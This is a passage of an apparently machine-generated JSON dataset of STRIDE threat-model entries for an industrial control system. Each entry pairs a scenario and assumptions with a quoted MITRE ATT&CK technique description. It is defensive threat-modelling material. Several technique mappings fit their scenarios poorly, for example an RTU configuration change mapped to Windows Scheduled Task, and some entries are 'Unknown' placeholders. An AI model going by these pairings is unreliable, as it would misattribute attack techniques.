                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A maintenance technician claims no changes were made to PLC configurations despite evidence of altered behavior.",
            "Assumptions": [
                {
                    "Assumption": "Configuration changes are not logged.",
                    "Role": "System Designer",
                    "Condition": "System does not log changes to PLC configurations reliably."
                },
                {
                    "Assumption": "There is no access control for configuration changes.",
                    "Role": "System Designer",
                    "Condition": "PLCs lack strict access control for making changes."
                },
                {
                    "Assumption": "No secondary verification process for critical updates.",
                    "Role": "System Designer",
                    "Condition": "System does not use a confirmation process for important changes."
                }
            ],
            "Potential Impact": "Untracked configuration changes can lead to issues with maintaining system integrity.",
            "MITRE ATT&CK Keywords": [
                "maintenance repudiation",
                "configuration change",
                "access control",
                "audit logging"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider denies uploading sensitive data to an external cloud service after a data leak is discovered.",
            "Assumptions": [
                {
                    "Assumption": "Data transfer activities are not logged.",
                    "Role": "System Designer",
                    "Condition": "Lack of logging for data transfers to external services."
                },
                {
                    "Assumption": "Access control policies for data export are not enforced.",
                    "Role": "System Designer",
                    "Condition": "Policies for data movement are not properly enforced."
                },
                {
                    "Assumption": "The insider has sufficient privileges to access and move data.",
                    "Role": "Insider",
                    "Condition": "User privileges are high enough to permit data export."
                }
            ],
            "Potential Impact": "Difficult to attribute the data leak to the responsible individual.",
            "MITRE ATT&CK Keywords": [
                "data leakage",
                "action repudiation",
                "external data transfer",
                "privilege abuse"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted data sent from field devices to the gateway.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "System uses unencrypted communication protocols for data transfer."
                },
                {
                    "Assumption": "The attacker can access the communication network.",
                    "Role": "Attacker",
                    "Condition": "Network access controls are ineffective or bypassed."
                },
                {
                    "Assumption": "Sensitive data is transmitted without security measures.",
                    "Role": "System Designer",
                    "Condition": "Data security measures are not applied during transmission."
                }
            ],
            "Potential Impact": "Sensitive operational data could be exposed, leading to potential IP theft or competitive disadvantages.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "unencrypted communication",
                "network access",
                "sensitive data exposure"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries with privileged network access may seek to modify network traffic in real time using adversary-in-the-middle (AiTM) attacks. (Citation: Gabriel Sanchez October 2017) This type of attack allows the adversary to intercept traffic to and/or from a particular device on the network. If a AiTM attack is established, then the adversary has the ability to block, log, modify, or inject traffic into the communication stream. There are several ways to accomplish this attack, but some of the most-common are Address Resolution Protocol (ARP) poisoning and the use of a proxy. (Citation: Bonnie Zhu, Anthony Joseph, Shankar Sastry 2011)  \n\nAn AiTM attack may allow an adversary to perform the following attacks:  \n[Block Reporting Message](https://attack.mitre.org/techniques/T0804), [Spoof Reporting Message](https://attack.mitre.org/techniques/T0856), [Modify Parameter](https://attack.mitre.org/techniques/T0836), [Unauthorized Command Message](https://attack.mitre.org/techniques/T0855)",
                "id": "attack-pattern--9a505987-ab05-4f46-a9a6-6441442eec3b",
                "technique_id": "T0830"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider exfiltrates sensitive information from the MES database.",
            "Assumptions": [
                {
                    "Assumption": "The insider has legitimate access.",
                    "Role": "Insider",
                    "Condition": "User permissions allow access to sensitive data."
                },
                {
                    "Assumption": "No detection or prevention systems for data exfiltration.",
                    "Role": "System Designer",
                    "Condition": "Lack of data loss prevention tools or monitoring."
                },
                {
                    "Assumption": "Database activity is not adequately monitored.",
                    "Role": "System Designer",
                    "Condition": "Insufficient monitoring of database access and export activities."
                }
            ],
            "Potential Impact": "Loss of confidential business information, potentially harming company reputation and finances.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "data exfiltration",
                "database access",
                "sensitive information"
            ],
            "mitre_technique": {
                "name": "Scheduled Transfer",
                "description": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",
                "id": "attack-pattern--4eeaf8a9-c86b-4954-a663-9555fb406466",
                "technique_id": "T1029"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Cloud service provider employee accesses stored sensitive data without authorization.",
            "Assumptions": [
                {
                    "Assumption": "Cloud data is not encrypted at rest.",
                    "Role": "System Designer",
                    "Condition": "Data encryption for cloud storage is not implemented."
                },
                {
                    "Assumption": "Cloud service access controls are insufficient.",
                    "Role": "Cloud Provider",
                    "Condition": "Access control policies are inadequately enforced."
                },
                {
                    "Assumption": "Audit logs for data access are not reviewed.",
                    "Role": "System Designer",
                    "Condition": "Cloud provider's audit logs are not actively reviewed."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data, leading to privacy breaches and loss of trust.",
            "MITRE ATT&CK Keywords": [
                "cloud security",
                "unauthorized access",
                "data breach",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A brute force attack overloads the control center HMI, causing it to fail.",
            "Assumptions": [
                {
                    "Assumption": "System does not have rate-limiting mechanisms.",
                    "Role": "System Designer",
                    "Condition": "No rate limiting or anti-automation defense in place."
                },
                {
                    "Assumption": "The attacker can generate extensive traffic towards the HMI.",
                    "Role": "Attacker",
                    "Condition": "Attack uses tools to send a large volume of requests."
                },
                {
                    "Assumption": "HMI software is not resilient to high traffic loads.",
                    "Role": "System Designer",
                    "Condition": "HMI not designed to handle excessive traffic."
                }
            ],
            "Potential Impact": "HMI unavailability disrupts monitoring and control, potentially leading to unsafe operational conditions.",
            "MITRE ATT&CK Keywords": [
                "brute force",
                "denial of service",
                "HMI overload",
                "traffic generation"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infects RTUs, causing them to crash and stop collecting data.",
            "Assumptions": [
                {
                    "Assumption": "RTUs lack anti-malware protection.",
                    "Role": "System Designer",
                    "Condition": "No malware protection or inadequate anti-malware measures."
                },
                {
                    "Assumption": "Malicious software can propagate through the network.",
                    "Role": "Attacker",
                    "Condition": "Network segmentation and malware isolation are inadequate."
                },
                {
                    "Assumption": "RTU firmware is outdated and vulnerable.",
                    "Role": "System Designer",
                    "Condition": "Firmware updates are not regularly applied to RTUs."
                }
            ],
            "Potential Impact": "Loss of data collection from field devices and the inability to monitor and control processes.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "RTU infection",
                "system crash",
                "data collection disruption"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Cloud service outages prevent access to critical manufacturing data and analytics.",
            "Assumptions": [
                {
                    "Assumption": "Dependence on a single cloud provider.",
                    "Role": "System Designer",
                    "Condition": "No redundancy or failover for cloud services."
                },
                {
                    "Assumption": "No local data backups.",
                    "Role": "System Designer",
                    "Condition": "Critical data is exclusively stored in the cloud without local backups."
                },
                {
                    "Assumption": "Cloud provider experiences widespread outages.",
                    "Role": "Cloud Provider",
                    "Condition": "Service interruptions due to technical faults or attacks."
                }
            ],
            "Potential Impact": "Inability to access critical data impacts decision-making and process optimization, leading to operational delays.",
            "MITRE ATT&CK Keywords": [
                "cloud outage",
                "data access disruption",
                "analytics disruption",
                "provider dependency"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the MES to gain admin-level access.",
            "Assumptions": [
                {
                    "Assumption": "The MES has unpatched software vulnerabilities.",
                    "Role": "System Designer",
                    "Condition": "Software is not regularly updated to patch known vulnerabilities."
                },
                {
                    "Assumption": "Access control policies are not effectively enforced.",
                    "Role": "System Designer",
                    "Condition": "Inadequate enforcement of role-based access controls in the MES."
                },
                {
                    "Assumption": "The attacker can execute code within the MES environment.",
                    "Role": "Attacker",
                    "Condition": "Exploit allows malicious code execution."
                }
            ],
            "Potential Impact": "Gaining admin access allows full control over the MES, leading to potential data manipulation, leaks, and system disruptions.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "exploit",
                "MES vulnerability",
                "admin access takeover"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider with legitimate access to the control center escalates privileges to manipulate critical production parameters.",
            "Assumptions": [
                {
                    "Assumption": "Role-based access controls are weakly implemented.",
                    "Role": "System Designer",
                    "Condition": "Gaps in implementing strict role-based access controls."
                },
                {
                    "Assumption": "There are no secondary checks for privilege escalation.",
                    "Role": "System Designer",
                    "Condition": "Lack of mechanisms for dual approval or secondary verification of privilege changes."
                },
                {
                    "Assumption": "Logging and monitoring of privilege changes are insufficient.",
                    "Role": "System Designer",
                    "Condition": "Privilege changes are not comprehensively logged and monitored."
                }
            ],
            "Potential Impact": "Unauthorized changes to critical parameters may lead to production inefficiencies or safety hazards.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "privilege escalation",
                "access control",
                "parameter manipulation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in PLC firmware to gain control over field devices.",
            "Assumptions": [
                {
                    "Assumption": "PLCs run outdated or unverified firmware.",
                    "Role": "System Designer",
                    "Condition": "Firmware updates are not enforced or verified."
                },
                {
                    "Assumption": "There are known vulnerabilities in the firmware.",
                    "Role": "Attacker",
                    "Condition": "Vulnerabilities exist and are publicly known or discovered."
                },
                {
                    "Assumption": "The attacker can deploy the exploit remotely or locally.",
                    "Role": "Attacker",
                    "Condition": "Access mechanisms allow for local or remote payload deployment."
                }
            ],
            "Potential Impact": "Control over field devices can lead to unauthorized actions, equipment damage, and operational hazards.",
            "MITRE ATT&CK Keywords": [
                "firmware exploit",
                "PLC control",
                "device takeover",
                "field device manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "18",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of an RTU to send unauthorized control commands to field devices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access the network connecting RTUs to the Control Center.",
                    "Role": "Attacker",
                    "Condition": "Valid if the network is not sufficiently segmented or protected."
                },
                {
                    "Assumption": "The RTU lacks strong authentication mechanisms.",
                    "Role": "System Architect",
                    "Condition": "Valid if authentication methods such as certificates or multi-factor authentication are not implemented."
                }
            ],
            "Potential Impact": "Unauthorized control commands can disrupt industrial operations, leading to potential safety hazards.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "control system"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a fake Human-Machine Interface (HMI) to capture credentials from operators.",
            "Assumptions": [
                {
                    "Assumption": "Operators do not verify the authenticity of the HMI before entering credentials.",
                    "Role": "Operator",
                    "Condition": "Valid if there is no training or awareness program."
                },
                {
                    "Assumption": "The attacker can place the fake HMI in the operator's network.",
                    "Role": "Attacker",
                    "Condition": "Valid if the network is not segmented or monitored."
                }
            ],
            "Potential Impact": "Credentials can be stolen and used to gain unauthorized access to the Control Center.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credentials",
                "HMI",
                "phishing",
                "user"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs cloud services to intercept and alter data being sent from the gateway.",
            "Assumptions": [
                {
                    "Assumption": "There is no mutual authentication between the gateway and cloud services.",
                    "Role": "System Architect",
                    "Condition": "Valid if mutual TLS or similar protocols are not enforced."
                },
                {
                    "Assumption": "The attacker has access to the communication channel between the gateway and cloud.",
                    "Role": "Attacker",
                    "Condition": "Valid if the communication channel is not secure or encrypted."
                }
            ],
            "Potential Impact": "Data can be intercepted or altered, affecting system integrity and real-time analytics.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "cloud",
                "gateway",
                "data interception",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the configuration of an RTU to cause malfunction.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or network access to the RTU.",
                    "Role": "Attacker",
                    "Condition": "Valid if physical security or network controls are weak."
                },
                {
                    "Assumption": "Configuration changes are not adequately monitored or logged.",
                    "Role": "System Administrator",
                    "Condition": "Valid if audit logs and monitoring systems are not in place."
                }
            ],
            "Potential Impact": "Operational data integrity is compromised, potentially disrupting manufacturing processes.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "configuration",
                "RTU",
                "system control"
            ],
            "mitre_technique": {
                "name": "Scheduled Task",
                "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) ",
                "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
                "technique_id": "T1053.005"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious firmware into a PLC to alter its control logic.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can upload firmware to the PLC.",
                    "Role": "Attacker",
                    "Condition": "Valid if firmware updates are not authenticated."
                },
                {
                    "Assumption": "The PLC does not verify the integrity of firmware before installing it.",
                    "Role": "System Architect",
                    "Condition": "Valid if integrity checks like cryptographic signatures are not implemented."
                }
            ],
            "Potential Impact": "Control logic manipulation can lead to equipment damage or unsafe operations.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "PLC",
                "control logic",
                "malicious code"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
